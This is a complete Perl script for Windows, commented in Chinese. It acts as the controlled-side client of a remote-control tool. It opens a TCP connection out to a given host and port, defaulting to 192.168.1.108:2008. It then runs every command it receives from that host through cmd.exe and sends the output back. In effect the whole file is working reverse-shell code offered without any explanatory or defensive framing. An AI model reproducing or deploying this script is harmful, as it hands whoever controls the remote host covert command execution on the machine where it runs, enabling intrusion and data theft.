
#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket;
use IO::Select;
use Socket;
use Win32::Job;

my $g={};
&init_display();
sub init_display{
	open(F,"language\\china.txt");
	while(<F>){
		if(/\{(.+)\}=(.+)/){
			$g->{display}->{$1}=$2;
		}
	}
	close(F);
}

#####变量定义#####
my $variables={"host" =>"",
               "port" =>"",
	           "sock" => "",
	           "select" => "",
               "cmd" => "",
	           "command" => "",
	          };
####变量定义结束####
$variables->{"host"}=$ARGV[0] || '192.168.1.108';
$variables->{"port"}=$ARGV[1] || 2008;
print "connect: $variables->{host} $variables->{port}\n";
###SOCKET建立连接###
######SOCKET建立成功即请求远控成功######
$variables->{"sock"}=new IO::Socket::INET(PeerAddr=>$variables->{"host"},
						   PeerPort=>$variables->{"port"},
                           Proto =>'TCP',
						   Timeout=>5,
	                       ) or die "connect err";
$variables->{"select"}=IO::Select->new($variables->{"sock"});
print "connect ok!\n";
print "CMD>";
my $sock=$variables->{"sock"};
my $select=$variables->{"select"};
#以下部分建立循环对远程对象进行读写操作
#while($variables->{"sock"}){
while($select->can_read()) {
$variables->{"command"}="";
sysread $sock,$variables->{"command"},10000;
chomp($variables->{"command"});
#print "调试信息：".$variables->{"command"}."\n";
unless($variables->{"command"}) {
				close($variables->{"sock"});
				exit(1);
			}
print "$variables->{\"command\"}\n";

&shell($variables->{"command"});
}
#}


sub shell{
my $in=shift;
my @cmd;

$in=&Delspace($in); #对接受的数据去掉回车换行和空格
		if($in eq "exit"){
			print $sock "exit";
			close($variables->{"sock"});
			exit(1);
		}
		else{
			if($in eq "cls"){system("cls");print $sock "cls";
						    }
			elsif($in=~/^([\w]:)$/ or $in=~/^cd[\s]*(.+)$/){  #由于程序运行中调用的所有命令都是临时性的shell 想要改变当前路径就要调用系统函数。所以。。。
				if(chdir($1)){
					@cmd=`echo %cd%`;print $sock "CMD>\n@cmd\n";
				}
				else{
					@cmd="$g->{display}->{file_beikong_nofind_path}。";print $sock "CMD>\n@cmd\n";
				}
			}
			else{	
				my $f="cmd_temp.txt";
				#只要不是cd 命令就将所有输入命令在此解释
				my $job = Win32::Job->new;
				$job->spawn('cmd',"cmd /c $in",{
						stdout => $f, 
						stderr => $f
				});  #定义一个job 运行这个命令通过此job，将命令返回信息写入到$f中 ，如果命令运行后没有立即返回，判定此命令打开了一个窗口程序。
				my $ok=$job->run(1);
				if($ok){#如果命令成功返回。
					open(F,$f);
					while(<F>){push @cmd,$_;}
					close(F);
					@cmd="$g->{display}->{file_beikong_input_donot_space}!" unless(@cmd);
					print $sock "CMD>\n@cmd\n";
					print @cmd;

				}
				else{
					print $sock "CMD>\n@cmd\n";
					print @cmd;
				}	
				unlink $f;
			}
		
		}
}

sub Delspace{
#	函数功能:返回输入参数去掉空格和回车后的数据。
	my $s=shift;
	$s=~s/^\s+//;
	$s=~s/\s+$//s;
	$s=~s/\r$//;
	return $s;
}





